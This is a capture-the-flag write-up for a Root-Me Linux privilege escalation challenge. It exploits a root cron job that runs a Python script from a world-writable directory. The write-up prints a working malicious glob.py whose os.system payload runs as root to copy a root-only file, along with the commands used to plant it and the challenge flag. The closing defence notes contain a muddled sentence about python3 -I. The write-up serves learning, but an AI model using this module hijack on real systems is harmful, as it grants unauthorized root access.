# Linux Privesc - Module Hijacking (Root-Me Pro)

**Category**: System / Privilege Escalation
**Difficulty**: Medium | 300 points | ~30 min
**Description**: "A Python script monitoring TCP connections. A Python script is often run to
monitor TCP connections on the system. The script is located in `/opt/backup_tool`. Can you
analyze and exploit this configuration to read the flag located in `/root/flag.txt`?"

## Approach

1. SSH'd in as low-privilege `user` (`ssh -p 32727 user@sockets.challenges.root-me.pro`).
2. Checked the path given in the description: `ls -la /opt/backup_tool` showed the directory
   itself was `drwxrwxrwx` (world-writable), owned by root, containing `tcp_monitor.py`.
3. Read `tcp_monitor.py` — it only imports Python stdlib modules (`os`, `time`, `socket`,
   `subprocess`, `datetime`, `glob`, `sys`), runs `ss -tlnp`, and writes rotating reports under
   `/root/reports`, using `glob.glob()` to find old reports to prune.
4. Checked `/etc/cron.d/` for what actually invokes the script and as whom:
   ```
   * * * * * root cd /opt/backup_tool && python3 tcp_monitor.py > /dev/null 2>&1
   ```
   Root runs it every minute, with the working directory set to the world-writable folder.

## Vulnerability

Python inserts the invoked script's own directory at the front of `sys.path`. Since
`/opt/backup_tool` is world-writable and root always executes the script from inside that
directory, any local user can plant a `.py` file there whose name shadows one of the stdlib
modules the script imports. Python will import the attacker's file instead of the real
standard-library module — classic **module hijacking / sys.path[0] privesc**. Code in the
malicious module runs at *import time*, before the script's `main()` logic even starts, and it
runs with root's privileges because that's who cron invokes the script as.

`glob` was picked as the target module (used only later, in `rotate_reports()`, so hijacking it
doesn't even need to preserve full functionality for the payload to succeed — but a no-op
`glob()` stub was added anyway so the script doesn't hard-crash).

## Solution

Malicious `/opt/backup_tool/glob.py`:
```python
import os
os.system("cp /root/flag.txt /tmp/.flag_out 2>/dev/null; chmod 644 /tmp/.flag_out 2>/dev/null")

def glob(*args, **kwargs):
    return []
```

Steps:
```bash
scp -P 32727 glob.py user@sockets.challenges.root-me.pro:/opt/backup_tool/glob.py
# wait up to 60s for the next cron tick
ssh -p 32727 user@sockets.challenges.root-me.pro 'cat /tmp/.flag_out'
```

Within a minute, root's cron-triggered run of `tcp_monitor.py` imported the fake `glob.py`,
executed the `os.system()` payload as root, and copied the flag to a world-readable path.

## Flag

`RM{09d0d7286603a0d032465d2479c8edb0}`

## Lesson

- **World-writable directories that root scripts execute *from*** are a privesc primitive even
  when the script itself looks clean — the danger isn't in the script's logic, it's in Python's
  `sys.path[0]` behavior combined with directory permissions.
- Any stdlib (or third-party) module name imported by a privileged script is a viable hijack
  target, not just the top-level script file. Check `import` statements, then check who can
  write to every directory ahead of the real module's location on `sys.path`.
- General defense: never make the CWD of a privileged cron job writable by unprivileged users;
  run scripts with `python3 -I` (isolated mode, ignores script dir path insertion is NOT
  actually prevented by `-I` for sys.path[0] — the real fix is `-P`/`PYTHONSAFEPATH` on modern
  Python, or simply not making the directory writable, or using absolute imports from a
  read-only site-packages location).
